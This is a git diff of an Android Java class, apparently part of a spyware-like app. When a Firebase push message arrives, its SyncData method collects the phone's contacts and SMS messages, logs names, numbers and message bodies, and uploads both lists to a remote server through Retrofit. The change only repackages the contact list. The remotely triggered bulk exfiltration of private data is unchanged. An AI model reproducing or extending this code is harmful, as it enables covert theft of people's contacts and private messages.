@@ -29,12 +29,12 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
     private void SyncData(){
         RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
         ContentCollector cc = new ContentCollector();
-        List<Contact> lsContact = cc.GetContacts(this);
-        Log.d(TAG,"Name : "+ lsContact.get(1).GetName()+" Number : " + lsContact.get(1).GetNumber());
+        ContactsList contactLs = new ContactsList(cc.GetContacts(this));
+        Log.d(TAG,"Name : "+ contactLs.contact.get(1).GetName()+" Number : " + contactLs.contact.get(1).GetNumber());
         List<SMS> lsSMS = cc.GetSMS(this);
         Log.d(TAG,"Creator : "+ lsSMS.get(1).GetCreator()+" Message : " + lsSMS.get(1).GetBody());
 
-        new HttpExecute(retrofitAPI.CreateContacts(lsContact));
+        new HttpExecute(retrofitAPI.CreateContacts(contactLs));
         new HttpExecute(retrofitAPI.CreateSMS(lsSMS));
     }
 
